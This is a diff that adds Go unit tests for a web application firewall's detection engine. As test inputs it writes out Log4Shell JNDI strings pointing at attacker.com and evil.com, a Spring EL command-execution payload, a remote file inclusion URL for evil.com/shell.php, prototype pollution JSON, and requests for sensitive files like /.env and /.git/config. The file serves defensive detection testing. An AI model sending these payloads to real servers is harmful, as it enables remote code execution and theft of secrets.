@@ -197,6 +197,180 @@ func TestUpdateConfig(t *testing.T) {
 	}
 }
 
+// TestJavaInjection vérifie la détection Log4Shell et Spring EL.
+func TestJavaInjection(t *testing.T) {
+	e := NewEngine(nil, slog.Default())
+
+	cases := []struct {
+		name  string
+		url   string
+		body  string
+		ctype string
+	}{
+		{"log4shell uri", "/?x=${jndi:ldap://attacker.com/a}", "", ""},
+		{"log4shell header", "/", "", ""},
+		{"spring el", "/api", `{"q":"#{Runtime.exec('id')}"}`, "application/json"},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			var r *http.Request
+			if tc.body != "" {
+				r = httptest.NewRequest(http.MethodPost, tc.url, strings.NewReader(tc.body))
+				r.Header.Set("Content-Type", tc.ctype)
+				r.ContentLength = int64(len(tc.body))
+			} else {
+				r = httptest.NewRequest(http.MethodGet, tc.url, nil)
+				if tc.name == "log4shell header" {
+					r.Header.Set("User-Agent", "${jndi:ldap://evil.com/x}")
+				}
+			}
+			matches := e.Inspect(r, 1)
+			found := false
+			for _, m := range matches {
+				if m.Category == "java" {
+					found = true
+					break
+				}
+			}
+			if !found {
+				t.Fatalf("%s: expected java match", tc.name)
+			}
+		})
+	}
+}
+
+// TestRFI vérifie la détection Remote File Inclusion.
+func TestRFI(t *testing.T) {
+	e := NewEngine(nil, slog.Default())
+
+	cases := []struct{ url, body string }{
+		{"/?file=php://filter/convert.base64-encode/resource=index.php", ""},
+		{"/api", "page=http://evil.com/shell.php end"},
+	}
+	for _, tc := range cases {
+		var r *http.Request
+		if tc.body != "" {
+			r = httptest.NewRequest(http.MethodPost, tc.url, strings.NewReader(tc.body))
+			r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+			r.ContentLength = int64(len(tc.body))
+		} else {
+			r = httptest.NewRequest(http.MethodGet, tc.url, nil)
+		}
+		matches := e.Inspect(r, 1)
+		found := false
+		for _, m := range matches {
+			if m.Category == "rfi" {
+				found = true
+				break
+			}
+		}
+		if !found {
+			t.Errorf("expected rfi match for %s", tc.url)
+		}
+	}
+}
+
+// TestNodeJSInjection vérifie la détection de prototype pollution.
+func TestNodeJSInjection(t *testing.T) {
+	e := NewEngine(nil, slog.Default())
+	payload := `{"__proto__":{"admin":true}}`
+	r := httptest.NewRequest(http.MethodPost, "/api", strings.NewReader(payload))
+	r.Header.Set("Content-Type", "application/json")
+	r.ContentLength = int64(len(payload))
+
+	matches := e.Inspect(r, 1)
+	found := false
+	for _, m := range matches {
+		if m.Category == "nodejs" {
+			found = true
+			break
+		}
+	}
+	if !found {
+		t.Fatal("expected nodejs match for prototype pollution")
+	}
+}
+
+// TestRestrictedFiles vérifie la détection d'accès à des fichiers sensibles.
+func TestRestrictedFiles(t *testing.T) {
+	e := NewEngine(nil, slog.Default())
+
+	cases := []string{
+		"/.env",
+		"/.git/config",
+		"/backup.sql",
+		"/wp-config.php",
+		"/phpinfo.php",
+	}
+	for _, u := range cases {
+		r := httptest.NewRequest(http.MethodGet, u, nil)
+		matches := e.Inspect(r, 1)
+		found := false
+		for _, m := range matches {
+			if m.Category == "restricted" {
+				found = true
+				break
+			}
+		}
+		if !found {
+			t.Errorf("expected restricted match for %s", u)
+		}
+	}
+}
+
+// TestResponseLeakage vérifie la détection de fuite dans les réponses.
+func TestResponseLeakage(t *testing.T) {
+	e := NewEngine(nil, slog.Default())
+
+	cases := []struct {
+		name string
+		body string
+		cat  string
+	}{
+		{"sql error", "You have an error in your SQL syntax near 'SELECT'", "leakage"},
+		{"php stack trace", "Fatal error: in /var/www/html/index.php on line 42", "leakage"},
+		{"aws key", "AKIAIOSFODNN7EXAMPLE is the key", "leakage"},
+		{"java exception", "Exception in thread java.lang.NullPointerException at com.example.App(App.java:10)", "leakage"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			matches := e.InspectResponse(tc.body)
+			found := false
+			for _, m := range matches {
+				if m.Category == tc.cat {
+					found = true
+					break
+				}
+			}
+			if !found {
+				t.Fatalf("%s: expected %s match", tc.name, tc.cat)
+			}
+		})
+	}
+}
+
+// TestMiddlewareResponseLeakageDetect vérifie le mode detect sur les réponses.
+func TestMiddlewareResponseLeakageDetect(t *testing.T) {
+	e := NewEngine(nil, slog.Default())
+	leakyBody := "You have an error in your SQL syntax near 'SELECT * FROM users'"
+	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.WriteHeader(http.StatusOK)
+		_, _ = w.Write([]byte(leakyBody))
+	})
+
+	h := e.Middleware(&router.WAFConfig{Enabled: true, Mode: "detect"}, next)
+	rr := httptest.NewRecorder()
+	h.ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/", nil))
+	// En mode detect, la réponse doit passer normalement.
+	if rr.Code != http.StatusOK {
+		t.Fatalf("detect: got %d", rr.Code)
+	}
+	if !strings.Contains(rr.Body.String(), "SQL syntax") {
+		t.Fatal("detect: response body should be passed through")
+	}
+}
+
 // TestContextMatches vérifie que les matches sont accessibles depuis le contexte.
 func TestContextMatches(t *testing.T) {
 	e := NewEngine(nil, slog.Default())
